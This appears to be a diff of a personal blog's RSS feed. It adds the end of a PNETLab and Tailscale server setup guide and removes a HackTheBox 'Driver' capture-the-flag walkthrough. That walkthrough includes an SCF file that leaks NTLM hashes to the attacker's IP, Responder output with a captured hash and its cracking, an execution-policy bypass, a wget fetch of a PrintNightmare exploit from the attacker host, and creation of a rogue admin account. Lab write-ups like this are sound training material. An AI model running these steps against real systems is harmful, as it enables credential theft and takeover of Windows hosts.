+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# ln -s /mnt/unetlab/labs/ /opt/unetlab/
+</span></span></code></pre></div><p>Change ownership of the new labs directory to ensure PNETLab&rsquo;s services can access it back.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# chown -R www-data:www-data /mnt/unetlab/labs/
+</span></span></code></pre></div><h3 id="configure-tailscale-vpn">Configure Tailscale VPN</h3>
+<p>We will register the server as a Tailscale node, so make sure you already generated an auth key in the Tailscale <a href="https://login.tailscale.com/admin/settings/keys">admin&rsquo;s console</a>.</p>
+<p>First, install Tailscale by executing the install script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# curl -fsSL https://tailscale.com/install.sh <span class="p">|</span> sh 
+</span></span></code></pre></div><p>We will configure the server as a subnet router or simply a router. This will allow direct access to the PNETLab QEMU/Docker appliances from your local network via the Tailscale network. To achieve this, we must allow IP forwarding in the server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# <span class="nb">echo</span> <span class="s1">&#39;net.ipv4.ip_forward = 1&#39;</span> <span class="p">|</span> sudo tee -a /etc/sysctl.d/99-tailscale.conf
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# <span class="nb">echo</span> <span class="s1">&#39;net.ipv6.conf.all.forwarding = 1&#39;</span> <span class="p">|</span> sudo tee -a /etc/sysctl.d/99-tailscale.conf
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# sudo sysctl -p /etc/sysctl.d/99-tailscale.conf
+</span></span></code></pre></div><p>Next, to register the server as a node in your Tailscale network and a subnet router, run the following command, replacing <code>tskey-auth-XXXXX</code> with your actual auth key and <code>10.0.10.0/24</code> with your PNETLab local network:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# tailscale up --auth-key<span class="o">=</span>tskey-auth-XXXXX  --advertise-route<span class="o">=</span>10.0.10.0/24
+</span></span></code></pre></div><blockquote>
+<p>In my case, <code>10.0.10.0/24</code> is my docker network, therefore I can communicate with all the docker appliances in this network locally via the pnetlab server that act as a gateway.</p>
+</blockquote>
+<p>Revisit your Tailscale&rsquo;s admin console. You should see a <code>Subnets</code> label on the pnetlab node.</p>
+<img src="./imgs/image-20250326110623945.png" alt="image-20250326110623945" style="zoom:50%;" />
+<p>Open the node settings, select &ldquo;<strong>edit route settings&hellip;</strong>&rdquo; and tick your network there.</p>
+<img src="./imgs/image-20250326100421964.png" alt="image-20250326100421964" style="zoom: 50%;" />
+<p>Save and exit.</p>
+<h3 id="update-grub-config">Update Grub Config</h3>
+<p>Remove the default grub config.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# rm /etc/default/grub.d/50-cloudimg-settings.cfg
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# update-grub
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# reboot
+</span></span></code></pre></div><h3 id="update-version-optional">Update Version (Optional)</h3>
+<p>After the installation completed, we can directly upgrade PNETLab to the latest version. Since it&rsquo;s an optional, I will just put the official guide link on how to upgrade the lab version: <a href="https://pnetlab.com/pages/releases">go here</a>.</p>
+<h2 id="configure-domain-name">Configure Domain Name</h2>
+<p>I&rsquo;d like to get rid of the self-signed warning and use a custom domain name when accessing PNETLab.  To do so, we will obtain a LetsEncrypt&rsquo;s certificate to replace the self-signed one and then configure a new DNS record: <code>pnetlab.yourdomain.com</code>. The DNS will be pointing to your Tailscale node&rsquo;s IP.</p>
+<p>For this step, I will assume that you already own a domain.</p>
+<h3 id="use-letsencrypt-ssl-on-pnetlab">Use LetsEncrypt SSL on PNETLab</h3>
+<p>On the pnetlab server, install <code>certbot</code> and prepare the work folder.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# sudo apt install -y certbot
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# mkdir letsencrypt/work letsencrypt/config letsencrypt/logs
+</span></span></code></pre></div><p>Run the following command to obtain a Let&rsquo;s Encrypt certificate and  complete the ACME DNS challenge with your DNS provider/hosting (NameCheap, Hostinger, etc).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# certbot certonly --agree-tos --email admin@yourdomain.com --manual --preferred-challenges<span class="o">=</span>dns -d <span class="se">\*</span>.yourdomain.com --config-dir ./letsencrypt/config --work-dir ./letsencrypt/work --logs-dir ./letsencrypt/logs
+</span></span></code></pre></div><p>Next, edit <code>/etc/apache2/sites-available/pnetlabs.conf</code> and change these values with your certificate path.</p>
+<pre tabindex="0"><code>SSLCertificateFile   /path/to/your/cert/cert1.pem
+SSLCertificateKeyFile /path/to/your/certkey/privkey1.pem
+</code></pre><p>Restart the apache services</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# systemctl restart apache2
+</span></span></code></pre></div><h3 id="create-dns-a-record">Create DNS A record</h3>
+<p>Go to your DNS hosting provider and add a new records with the following data:</p>
+<ul>
+<li>Type: A</li>
+<li>Hostname/Domain Name: <code>pnetlab.yourdomain.com</code></li>
+<li>IPv4: Pnetlab-Tailscale-IP</li>
+</ul>
+<p>Here&rsquo;s an example of using Cloudflare DNS management for your reference.</p>
+<img src="./imgs/image-20250326102815535.png" alt="image-20250326102815535" style="zoom: 33%;" />
+<blockquote>
+<p><code>100.126.1.2</code> is the tailscale node IP of my pnetlab server.</p>
+</blockquote>
+<p>Verify if your domain is mapped correctly using the <code>dig</code> command or <a href="https://toolbox.googleapps.com/apps/dig/#A/">Google Toolbox</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ dig pnetlab.gcp.fahmifj.space                         
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
+</span></span><span class="line"><span class="cl"><span class="p">;</span>pnetlab.fahmifj.space.	IN	A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
+</span></span><span class="line"><span class="cl">pnetlab.fahmifj.space. 300	IN	A	100.126.1.2
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span></code></pre></div><p>Once you done and get connected to Tailscale network, you should be able to access PNETLab from <code>pnetlab.yourdomain.com</code>.</p>
+<h2 id="troubleshoot">Troubleshoot</h2>
+<h3 id="cannot-install-packages">Cannot install packages</h3>
+<p>Try disable/comment this whole url line from the repository.</p>
+<pre tabindex="0"><code>#deb [trusted=yes] http://i-share.top/repo ./
+#deb [trusted=yes] http://repo.pnetlab.com ./
+</code></pre><h3 id="cloud-appliance-dhcp-not-working">Cloud Appliance: DHCP not working</h3>
+<p>Verify <code>udhcpd</code> service is running and enabled.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ service udhcpd status
+</span></span><span class="line"><span class="cl">$ cat /etc/default/udhcpd <span class="p">|</span> grep ENABLED
+</span></span></code></pre></div><p>Restart and update it if necessary and see if it&rsquo;s working.</p>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>Running GNS3 server on Apple M2 with Orbstack</title>
       <link>https://fahmifj.github.io/articles/running-gns3-on-apple-m2-orbstack/</link>
@@ -1078,218 +1444,6 @@ Path:
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
 </span></span><span class="line"><span class="cl">root@secret:~# cat root.txt
 </span></span><span class="line"><span class="cl">d1d6d....<span class="o">[</span>SNIP<span class="o">]</span>....
-</span></span></code></pre></div>]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Driver</title>
-      <link>https://fahmifj.github.io/hackthebox/driver/</link>
-      <pubDate>Sun, 25 Sep 2022 17:28:30 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/hackthebox/driver/</guid>
-      <description>Driver is also one of the machines listed in the HTB printer exploitation track. It starts with a website for updating Multi-Function Printer firmware, where it allows users to upload files to a file share. With no upload restriction, it is possible to drop off a malicious SCF file to steal the NTLM hash of anyone who tries to access the share where the file lives. The hash can be cracked to retrieve the user password and it allows me to set foothold on the machine via WinRM.</description>
-      <content:encoded><![CDATA[<p>Driver is also one of the machines listed in the HTB printer exploitation track. It starts with a website for updating Multi-Function Printer firmware, where it allows users to upload files to a file share. With no upload restriction, it is possible to drop off a malicious SCF file to steal the NTLM hash of anyone who tries to access the share where the file lives. The hash can be cracked to retrieve the user password and it allows me to set foothold on the machine via WinRM.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>Stealing NTLM hash</li>
-<li>Printer spooler exploitation with PrintNightmare</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li>Responder</li>
-<li>PrintNightmare exploit PoC</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>Performing full TCP scan with <code>nmap</code> reveals 4 open ports: Web/HTTP on <code>80</code> , MS-RPC on <code>135</code> , SMB on <code>445</code>, and WinRM on <code>5985</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
-</span></span><span class="line"><span class="cl">$ fscan 10.10.11.106 driver
-</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.106 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
-</span></span><span class="line"><span class="cl">nmap -p 80,135,445,5985 -sC -sV -oA nmap/all-tcp-ports-driver 10.10.11.106
-</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-18 16:25 EDT
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.106
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.049s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">PORT     STATE SERVICE      VERSION
-</span></span><span class="line"><span class="cl">80/tcp   open  http         Microsoft IIS httpd 10.0
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-auth: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized<span class="se">\x</span>0D
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Basic <span class="nv">realm</span><span class="o">=</span>MFP Firmware Update Center. Please enter password <span class="k">for</span> admin
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">135/tcp  open  msrpc        Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds Microsoft Windows <span class="m">7</span> - <span class="m">10</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
-</span></span><span class="line"><span class="cl">5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
-</span></span><span class="line"><span class="cl">Service Info: Host: DRIVER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Host script results:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
-</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
-</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-10-19T03:25:40
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2021-10-18T23:16:49
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 47.37 seconds
-</span></span></code></pre></div><p>Based on the results, it seems the website on port 80 requires an authentication first.</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
-<p>On SMB, anonymous login is not allowed.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
-</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.11.106 
-</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED
-</span></span></code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>Poking the website with curl returns a <code>401 Unauthorized</code> response.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
-</span></span><span class="line"><span class="cl">$ curl -sv 10.10.11.106
-</span></span><span class="line"><span class="cl">*   Trying 10.10.11.106:80...
-</span></span><span class="line"><span class="cl">* Connected to 10.10.11.106 <span class="o">(</span>10.10.11.106<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c1">#0)</span>
-</span></span><span class="line"><span class="cl">&gt; GET / HTTP/1.1
-</span></span><span class="line"><span class="cl">&gt; Host: 10.10.11.106
-</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/7.74.0
-</span></span><span class="line"><span class="cl">&gt; Accept: */*
-</span></span><span class="line"><span class="cl">&gt; 
-</span></span><span class="line"><span class="cl">* Mark bundle as not supporting multiuse
-</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 <span class="m">401</span> Unauthorized
-</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
-</span></span><span class="line"><span class="cl">&lt; Server: Microsoft-IIS/10.0
-</span></span><span class="line"><span class="cl">&lt; X-Powered-By: PHP/7.3.25
-</span></span><span class="line"><span class="cl">&lt; WWW-Authenticate: Basic <span class="nv">realm</span><span class="o">=</span><span class="s2">&#34;MFP Firmware Update Center. Please enter password for admin&#34;</span>
-</span></span><span class="line"><span class="cl">&lt; Date: Tue, <span class="m">19</span> Oct <span class="m">2021</span> 04:03:53 GMT
-</span></span><span class="line"><span class="cl">&lt; Content-Length: <span class="m">20</span>
-</span></span><span class="line"><span class="cl">&lt; 
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 10.10.11.106 left intact</span>
-</span></span><span class="line"><span class="cl">Invalid Credentials%
-</span></span></code></pre></div><p>Surprisingly, <code>admin:admin</code> is a valid credentials.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
-</span></span><span class="line"><span class="cl">$ curl -u <span class="s1">&#39;admin:admin&#39;</span> -I 10.10.11.106 
-</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
-</span></span><span class="line"><span class="cl">Content-Length: <span class="m">0</span>
-</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
-</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
-</span></span><span class="line"><span class="cl">X-Powered-By: PHP/7.3.25
-</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">19</span> Oct <span class="m">2021</span> 04:07:15 GMT
-</span></span></code></pre></div><p>At the home page, it tells the purpose of this website. At the bottom, there&rsquo;s a potential username.</p>
-<p><div class="img-container"><img src="imgs/image-20211019040903346.png" alt="image-20211019040903346"  /></div>
-</p>
-<p>On the Firmware Updates menu, there&rsquo;s an upload function.</p>
-<p><div class="img-container"><img src="imgs/image-20211019041022554.png" alt="image-20211019041022554"  /></div>
-</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-tony">Shell as tony</h3>
-<h4 id="stealing-ntlm-response">Stealing NTLM Response</h4>
-<p>The firmware updates page actually gives a hint, where it states that the uploaded file will be put into a file share. The file will also be reviewed by a testing team.</p>
-<p><div class="img-container"><img src="imgs/image-20211020034608009.png" alt="image-20211020034608009"  /></div>
-</p>
-<p>The idea here is to steal the NTLM hash of the testing team.</p>
-<p>My first attempt was putting an exe file by assuming the team would do some interaction like clicking on the file after it gets uploaded on the share. But nothing come back to my listener</p>
-<p>And then I found <a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/">this blog</a> and learned that an SCF (shell command file) can be used to trigger NTLM authentication without interaction with the file itself.</p>
-<p>From here, I&rsquo;ll create an SCF file and upload it to the web. I&rsquo;ll start responder as well. Once the testing team visit the share folder, the explorer will try to resolve the network path looking for the icon.</p>
-<p><code>iamf.scf</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[Shell]
-</span></span><span class="line"><span class="cl">Command=2
-</span></span><span class="line"><span class="cl">IconFile=\\10.10.14.11\iamf.ico
-</span></span><span class="line"><span class="cl">[Taskbar]
-</span></span><span class="line"><span class="cl">Command=ToggleDesktop
-</span></span></code></pre></div><p>On my responder, it captures hash of user <code>tony</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.11» 
-</span></span><span class="line"><span class="cl">$ sudo responder -w -I tun0
-</span></span><span class="line"><span class="cl">                                         __
-</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
-</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
-</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
-</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.0.6.0
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
-</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.10.11.106
-</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : DRIVER<span class="se">\t</span>ony
-</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : tony::DRIVER:718de45096091894:2635472ECA8116616D85DF31C5271692:010100000000000080E4F7F905C5D701E1F7DFE8E2F4DE370000000002000800390043004500550001001E00570049004E002D004A00340043004E005A004D00300050004A004F00500004003400570049004E002D004A00340043004E005A004D00300050004A004F0050002E0039004300450055002E004C004F00430041004C000300140039004300450055002E004C004F00430041004C000500140039004300450055002E004C004F00430041004C000700080080E4F7F905C5D701060004000200000008003000300000000000000000000000002000008363172F7CE9FE7884871E6477C46D539D00C6773AF2BB03792621108883B6390A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000 
-</span></span></code></pre></div><h4 id="hash-crack">Hash crack</h4>
-<p>The password can easily be cracked with <code>hashcat</code> and <code>rockyou.txt</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ hashcat -m <span class="m">5600</span> <span class="s1">&#39;tony::DRIVER:718de45096091894:2635472ECA8116616D85DF31C5271692:01...[SNIP]...&#39;</span> /c/tools/rockyou.txt --show
-</span></span><span class="line"><span class="cl">tony::DRIVER:718de45096091894:2635472ECA8116616D85DF31C5271692:01...<span class="o">[</span>SNIP<span class="o">]</span>...:liltony
-</span></span></code></pre></div><h4 id="winrm">WinRM</h4>
-<p>The credentials can be used for remote access via WinRM</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.11» 
-</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.106 -u <span class="s1">&#39;tony&#39;</span> -p liltony
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; 
-</span></span></code></pre></div><p>The user flag is done here.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop&gt; dir
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
-</span></span><span class="line"><span class="cl">----                -------------         ------ ----
-</span></span><span class="line"><span class="cl">-ar---       10/19/2021   5:40 PM             <span class="m">34</span> user.txt
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop&gt; gc user.txt
-</span></span><span class="line"><span class="cl">f04c7b...<span class="o">[</span>SNIP<span class="o">]</span>...
-</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as--administrator">Shell as  Administrator</h3>
-<h4 id="printnightmare">PrintNightmare</h4>
-<p>I quickly check if the spooler service is running because the box is named &ldquo;Driver&rdquo; and the website is all about printers. And It&rsquo;s!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; Get-Service -name spooler
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Status   Name               DisplayName
-</span></span><span class="line"><span class="cl">------   ----               -----------
-</span></span><span class="line"><span class="cl">Running  spooler            Print Spooler
-</span></span></code></pre></div><p>At that time, the PrintNightmare vulnerability (CVE-2021-1675) is still a fresh thing, so it&rsquo;s worth to try.</p>
-<p>First, I&rsquo;ll grab the <a href="https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1">PowerShell exploit module</a> from my machine</p>
-<pre tabindex="0"><code>*Evil-WinRM* PS C:\users\tony\downloads&gt; wget 10.10.14.11:8000/CVE-2021-1675.ps1 -UseBasicParsing -outfile CVE-2021-1675.ps1
-</code></pre><p>But during import, it fails.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">File C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads<span class="se">\C</span>VE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID<span class="o">=</span>135170.
-</span></span><span class="line"><span class="cl">At line:1 char:1
-</span></span><span class="line"><span class="cl">+ Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
-</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-</span></span><span class="line"><span class="cl">    + CategoryInfo          : SecurityError: <span class="o">(</span>:<span class="o">)</span> <span class="o">[</span>Import-Module<span class="o">]</span>, PSSecurityException
-</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
-</span></span></code></pre></div><p>That&rsquo;s because the shell are get restricted. Fortunately, it is possible to bypass this restriction with the following command:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force<span class="p">;</span>
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Get-ExecutionPolicy
-</span></span><span class="line"><span class="cl">Unrestricted
-</span></span></code></pre></div><p>Now I can load the module and run the <code>Invoke-Nightmare</code> command</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Invoke-Nightmare
-</span></span></code></pre></div><p>The command creates a default local admin user <code>adm1n</code> and password of <code>P@ssw0rd</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.11» 
-</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.106 -u <span class="s1">&#39;adm1n&#39;</span> -p<span class="s1">&#39;P@ssw0rd&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop<span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> root.txt
